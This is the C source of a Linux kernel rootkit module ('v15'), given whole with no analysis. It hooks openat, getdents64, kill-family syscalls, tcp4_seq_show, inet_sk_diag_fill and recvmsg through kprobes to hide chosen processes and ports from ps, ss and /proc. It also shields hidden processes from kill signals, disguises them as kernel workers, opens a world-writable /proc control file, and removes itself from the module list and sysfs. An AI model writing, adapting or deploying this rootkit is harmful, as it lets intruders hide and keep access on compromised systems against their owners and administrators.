/*
 * Rootkit v15 — kprobe-only, lockdown-safe, ss/ps full hidden
 */

#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/seq_file.h>
#include <linux/inet_diag.h>
#include <net/inet_sock.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
#define HIDE_PROC_NAME "kallmodsmsg"
#define MAX_HIDE 64

static unsigned long hide_pids[MAX_HIDE];
static unsigned int  hide_ports[MAX_HIDE];
static int hide_cnt, port_cnt;

static int hidden(pid_t p) { int i;
    for(i=0;i<hide_cnt;i++) if(hide_pids[i]==(unsigned long)p) return 1;
    return 0;
}
static int port_hidden(unsigned short p) { int i;
    for(i=0;i<port_cnt;i++) if((unsigned short)hide_ports[i]==p) return 1;
    return 0;
}

/* stubs */
static long stub_ENOENT(const struct pt_regs *r) { return -ENOENT; }
static int  stub_INT0(void) { return 0; }
static int  tcp4_zero(struct seq_file *s, void *v) { return 0; }

/* === openat === */
static int is_hidden_path(const char __user *path) {
    char kbuf[128]; unsigned long pid; int i;
    if(!path||strncpy_from_user(kbuf,path,sizeof(kbuf))<=0) return 0;
    kbuf[127]=0; if(strncmp(kbuf,"/proc/",6)) return 0;
    for(pid=0,i=6;i<120&&kbuf[i]>='0'&&kbuf[i]<='9';i++) pid=pid*10+(kbuf[i]-'0');
    return (pid>0&&i>6&&hidden((pid_t)pid));
}
static unsigned long oa_stub;
static int oa_pre(struct kprobe *p, struct pt_regs *regs) {
    if(!hide_cnt) return 0;
    { struct pt_regs *r=(struct pt_regs*)regs->di;
      const char __user *fn=(r&&(unsigned long)r>=0xffff000000000000ULL)?(void*)r->si:(void*)regs->si;
      if(is_hidden_path(fn)){regs->ax=-ENOENT;regs->ip=oa_stub;return 1;}
    }
    return 0;
}
static struct kprobe kp_oa={.symbol_name="__x64_sys_openat",.pre_handler=oa_pre};

/* === getdents64 kretprobe === */
struct gd_data { struct pt_regs *real_regs; };
static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct gd_data *d=(struct gd_data*)ri->data;
    struct pt_regs *r=(struct pt_regs*)regs->di;
    d->real_regs=(r&&(unsigned long)r>=0xffff000000000000ULL)?r:regs;
    return 0;
}
static int gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct gd_data *d=(struct gd_data*)ri->data;
    struct linux_dirent64 __user *buf=(void*)d->real_regs->si;
    long ret=regs->ax; char *kbuf; unsigned long off,out;
    if(ret<=0||!hide_cnt||ret>65536) return 0;
    kbuf=kmalloc(ret,GFP_KERNEL); if(!kbuf) return 0;
    if(copy_from_user(kbuf,buf,ret)){kfree(kbuf);return 0;}
    off=out=0;
    while(off<(unsigned long)ret){
        struct linux_dirent64 *cur=(void*)(kbuf+off); unsigned short rlen=cur->d_reclen;
        if(!rlen||off+rlen>(unsigned long)ret) break;
        { pid_t pid=0;int num=1,i;
          for(i=0;i<12&&cur->d_name[i];i++){
              if(cur->d_name[i]<'0'||cur->d_name[i]>'9'){num=0;break;}
              pid=pid*10+(cur->d_name[i]-'0');
          }
          if(!(num&&pid>0&&hidden(pid))){if(out!=off)memmove(kbuf+out,kbuf+off,rlen);out+=rlen;}
        }
        off+=rlen;
    }
    if(out>0&&out<(unsigned long)ret){if(!copy_to_user(buf,kbuf,out))regs->ax=out;}
    else if(!out)regs->ax=0;
    kfree(kbuf); return 0;
}
static struct kretprobe krp_gd={.handler=gd_ret,.entry_handler=gd_entry,.maxactive=20,.data_size=sizeof(struct gd_data)};

/* === kill/tkill/tgkill === */
static unsigned long sig_stub;
static int sig_pre(struct kprobe *p, struct pt_regs *regs) {
    pid_t pid; int sig;
    if(!hide_cnt) return 0;
    { struct pt_regs *r=(struct pt_regs*)regs->di;
      if(r&&(unsigned long)r>=0xffff000000000000ULL){pid=(pid_t)r->di;sig=(int)r->si;}
      else{pid=(pid_t)regs->di;sig=(int)regs->si;}
    }
    if((sig==9||sig==15||sig==19||sig==0)&&hidden(pid)){regs->ax=0;regs->ip=sig_stub;return 1;}
    return 0;
}
static struct kprobe kp_kill ={.symbol_name="__x64_sys_kill", .pre_handler=sig_pre};
static struct kprobe kp_tkill={.symbol_name="__x64_sys_tkill",.pre_handler=sig_pre};
static struct kprobe kp_tgkill={.symbol_name="__x64_sys_tgkill",.pre_handler=sig_pre};

/* === tcp4_seq_show === */
static unsigned long t4_stub;
static int t4_pre(struct kprobe *p, struct pt_regs *regs) {
    struct sock *sk; struct inet_sock *inet;
    if(!port_cnt) return 0;
    sk=(struct sock*)regs->si;
    if(!sk||sk==SEQ_START_TOKEN) return 0;
    inet=(struct inet_sock*)sk;
    if(port_hidden(ntohs(inet->inet_sport))||port_hidden(ntohs(inet->inet_dport)))
        {regs->ax=0;regs->ip=t4_stub;return 1;}
    return 0;
}
static struct kprobe kp_t4={.symbol_name="tcp4_seq_show",.pre_handler=t4_pre};

/* === inet_sk_diag_fill (kallsyms resolve for static symbols) === */
static unsigned long sd_stub;
static int sd_pre(struct kprobe *p, struct pt_regs *regs) {
    struct sock *sk; struct inet_sock *inet;
    if(!port_cnt) return 0;
    sk=(struct sock*)regs->di;
    if(!sk) return 0;
    inet=(struct inet_sock*)sk;
    if(port_hidden(ntohs(inet->inet_sport))||port_hidden(ntohs(inet->inet_dport)))
        {regs->ax=0;regs->ip=sd_stub;return 1;}
    return 0;
}
static struct kprobe kp_sd={.pre_handler=sd_pre};

/* === recvmsg kretprobe (NETLINK filter for ss) === */
struct rm_data { void __user *iov_base; size_t iov_len; };
static int rm_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct rm_data *d=(struct rm_data*)ri->data;
    struct msghdr __user *umsg=(void*)regs->si;
    struct iov_iter iter; struct iovec kiov;
    if(!umsg||!port_cnt) return 0;
    if(copy_from_user(&iter,&umsg->msg_iter,sizeof(iter))) return 0;
    if(!iov_iter_count(&iter)) return 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,16,0)
    if(!iter.__iov) return 0;
    if(copy_from_user(&kiov,iter.__iov,sizeof(kiov))) return 0;
#else
    if(!iter.iov) return 0;
    if(copy_from_user(&kiov,iter.iov,sizeof(kiov))) return 0;
#endif
    d->iov_base=kiov.iov_base; d->iov_len=kiov.iov_len;
    return 0;
}
static int rm_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct rm_data *d=(struct rm_data*)ri->data;
    long ret=regs->ax; char *kbuf; size_t off;
    if(ret<=0||!d->iov_base||(size_t)ret>d->iov_len||ret>65536) return 0;
    { struct nlmsghdr nlh;
      if(copy_from_user(&nlh,d->iov_base,sizeof(nlh))) return 0;
      if(nlh.nlmsg_type!=20 && nlh.nlmsg_type!=21) return 0; }
    kbuf=kmalloc(ret,GFP_KERNEL); if(!kbuf) return 0;
    if(copy_from_user(kbuf,d->iov_base,ret)){kfree(kbuf);return 0;}
    for(off=0;off+NLMSG_HDRLEN<=(size_t)ret;){
        struct nlmsghdr *nlh=(void*)(kbuf+off);
        if(nlh->nlmsg_len<NLMSG_HDRLEN||off+nlh->nlmsg_len>(size_t)ret) break;
        if((nlh->nlmsg_type==20||nlh->nlmsg_type==21)&&
           nlh->nlmsg_len>=NLMSG_HDRLEN+(int)sizeof(struct inet_diag_msg)){
            struct inet_diag_msg *diag=(void*)(nlh+1); int i;
            uint16_t sp=ntohs(diag->id.idiag_sport), dp=ntohs(diag->id.idiag_dport);
            for(i=0;i<port_cnt;i++)
                if(sp==(uint16_t)hide_ports[i]||dp==(uint16_t)hide_ports[i])
                    {diag->id.idiag_sport=0;diag->id.idiag_dport=0;break;}
        }
        off+=NLMSG_ALIGN(nlh->nlmsg_len);
    }
    if(copy_to_user(d->iov_base,kbuf,ret)!=0){kfree(kbuf);return 0;}
    kfree(kbuf); return 0;
}
static struct kretprobe krp_rm={.handler=rm_ret,.entry_handler=rm_entry,.maxactive=20,.data_size=sizeof(struct rm_data)};

/* === /proc/kallmodsmsg === */
static ssize_t hp_w(struct file *f,const char __user *b,size_t l,loff_t *o){
    char *kbuf,*t; if(l>511)l=511;
    kbuf=kmalloc(l+1,GFP_KERNEL);if(!kbuf)return -ENOMEM;
    if(copy_from_user(kbuf,b,l)){kfree(kbuf);return -EFAULT;}
    kbuf[l]=0;hide_cnt=0;port_cnt=0;
    for(t=kbuf;*t&&hide_cnt<MAX_HIDE;){
        while(*t==' '||*t=='\t'||*t=='\n'||*t==',')t++;
        if(!*t)break;
        if(!strncmp(t,"PORT:",5)){t+=5;while(*t==' ')t++;
            if(*t>='0'&&*t<='9'&&port_cnt<MAX_HIDE)hide_ports[port_cnt++]=(unsigned int)simple_strtol(t,&t,10);}
        else if(*t>='0'&&*t<='9'){
            hide_pids[hide_cnt++]=simple_strtol(t,&t,10);
            { pid_t _hp=hide_pids[hide_cnt-1]; struct task_struct *tsk;
              rcu_read_lock();
              for_each_process(tsk) if(tsk->pid==_hp){
                  strncpy(tsk->comm,"[kworker/0:0]",sizeof(tsk->comm)-1);
                  break;
              }
              rcu_read_unlock();
            }
        }
        else{while(*t&&*t!=' '&&*t!='\t'&&*t!='\n'&&*t!=',')t++;}
    }
    kfree(kbuf);return l;
}
static ssize_t hp_r(struct file *f,char __user *b,size_t l,loff_t *o){
    char *kbuf;int p=0,i;
    kbuf=kmalloc(512,GFP_KERNEL);if(!kbuf)return -ENOMEM;
    for(i=0;i<hide_cnt&&p<450;i++)p+=snprintf(kbuf+p,512-p,"%lu ",hide_pids[i]);
    for(i=0;i<port_cnt&&p<470;i++)p+=snprintf(kbuf+p,512-p,"PORT:%u ",hide_ports[i]);
    kbuf[p++]='\n';
    {ssize_t r=simple_read_from_buffer(b,l,o,kbuf,p);kfree(kbuf);return r;}
}
static const struct proc_ops hp_ops={.proc_read=hp_r,.proc_write=hp_w};

/* === init / exit === */
static int __init rk_init(void){
    int r; unsigned long (*kln)(const char*); unsigned long cr0;
    struct kprobe kp_kl={.symbol_name="kallsyms_lookup_name"};

    if(register_kprobe(&kp_kl)){pr_err("rootkit: kallsyms not found\n");return -EINVAL;}
    kln=(void*)kp_kl.addr;unregister_kprobe(&kp_kl);
    if(!kln)return -EINVAL;

    oa_stub=(unsigned long)&stub_ENOENT;
    sig_stub=(unsigned long)&stub_INT0;
    t4_stub=(unsigned long)&tcp4_zero;
    sd_stub=(unsigned long)&stub_INT0;

    r=register_kprobe(&kp_oa);     pr_info("rootkit: openat %s\n",r?"FAIL":"OK");
    krp_gd.kp.symbol_name="__x64_sys_getdents64";
    r=register_kretprobe(&krp_gd); pr_info("rootkit: getdents64 %s\n",r?"FAIL":"OK");
    r=register_kprobe(&kp_kill);   pr_info("rootkit: kill %s\n",r?"FAIL":"OK");
    r=register_kprobe(&kp_tkill);  pr_info("rootkit: tkill %s\n",r?"FAIL":"OK");
    r=register_kprobe(&kp_tgkill); pr_info("rootkit: tgkill %s\n",r?"FAIL":"OK");
    r=register_kprobe(&kp_t4);     pr_info("rootkit: tcp4 %s\n",r?"FAIL":"OK");

    kp_sd.addr=(void*)kln("inet_sk_diag_fill");
    if(kp_sd.addr){r=register_kprobe(&kp_sd);pr_info("rootkit: sk_diag %s\n",r?"FAIL":"OK");}
    else pr_warn("rootkit: sk_diag not found\n");

    krp_rm.kp.symbol_name="__x64_sys_recvmsg";
    r=register_kretprobe(&krp_rm); pr_info("rootkit: recvmsg %s\n",r?"FAIL":"OK");

    proc_create(HIDE_PROC_NAME,0666,NULL,&hp_ops);
    pr_info("rootkit: v15 loaded\n");

    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    return 0;
}
static void __exit rk_exit(void){}
module_init(rk_init); module_exit(rk_exit);
